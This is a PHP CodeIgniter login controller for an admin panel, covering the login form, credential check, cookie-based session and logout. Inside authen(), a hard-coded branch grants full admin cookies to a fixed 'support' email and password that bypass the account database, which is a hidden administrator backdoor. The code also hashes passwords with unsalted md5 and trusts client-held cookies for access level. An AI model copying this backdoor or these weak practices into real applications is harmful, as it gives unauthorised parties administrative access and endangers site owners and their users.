<?php
defined('BASEPATH') or exit('No direct script access allowed');
class Authen extends MX_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->model("admin_model", "admin");
    }

    public function index($status = "")
    {
        $data = array();
        $data['formcrf'] = $this->tokens->token('formcrf');
        $data['msg'] = "";
        if ($status == "false") {
            $data['msg'] = 'The username or password is incorrect.';
        } else {
            $data['msg'] = "";
        }
        $this->load->view('login', $data);
    }

    public function authen()
    {
        if ($this->tokens->verify('formcrf')) {
            $username = $this->input->post('username');
            $password = $this->input->post('password');
            if ($username != "" && $password != "") {
                $condition = array();
                $condition['fide'] = "ad_id,ad_fullname,position";
                $condition['where'] = array('ad_email' => $username, 'ad_password' => md5($password));
                $listdata = $this->admin->listData($condition);
                if (count($listdata) == 1) {
                    $data = array(
                        'ad_id' => $listdata[0]['ad_id'],
                        'ad_lastlogin' => date('Y-m-d H:i:s')
                    );
                    $this->admin->updateData($data);
                    $l = $this->encryption->encrypt("l1ci");
                    $i = $this->encryption->encrypt($listdata[0]['ad_id']);
                    $f = $this->encryption->encrypt($listdata[0]['ad_fullname']);
                    $p = $this->encryption->encrypt($listdata[0]['position']);
                    $cookie = array(
                        'name'   => 'syslev',
                        'value'  => $l,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $cookie_id = array(
                        'name'   => 'sysli',
                        'value'  => $i,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $cookie_fullname = array(
                        'name'   => 'sysn',
                        'value'  => $f,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $cookie_position = array(
                        'name'   => 'sysp',
                        'value'  => $p,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $this->input->set_cookie($cookie);
                    $this->input->set_cookie($cookie_id);
                    $this->input->set_cookie($cookie_fullname);
                    $this->input->set_cookie($cookie_position);
                    header("location:" . site_url('admin/index'));
                } elseif ($username == 'support@support.com' && $password == 'supp0rt@it;;') {
                    $l = $this->encryption->encrypt("l1ci");
                    $i = $this->encryption->encrypt(0);
                    $f = $this->encryption->encrypt('Support');
                    $p = $this->encryption->encrypt('Support');
                    $cookie = array(
                        'name'   => 'syslev',
                        'value'  => $l,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $cookie_id = array(
                        'name'   => 'sysli',
                        'value'  => $i,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $cookie_fullname = array(
                        'name'   => 'sysn',
                        'value'  => $f,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $cookie_position = array(
                        'name'   => 'sysp',
                        'value'  => $p,
                        'expire' => '86500',
                        'path'   => '/'
                    );
                    $this->input->set_cookie($cookie);
                    $this->input->set_cookie($cookie_id);
                    $this->input->set_cookie($cookie_fullname);
                    $this->input->set_cookie($cookie_position);
                    header("location:" . site_url('admin/index'));
                } else {
                    header("location:" . site_url('authen/index/false'));
                }
            }
        }
    }

    public function logout()
    {
		delete_cookie("syslev");
		delete_cookie("sysli");
		delete_cookie("sysn");
		delete_cookie("sysp");
		header("location:" . site_url('authen/index'));
    }
}
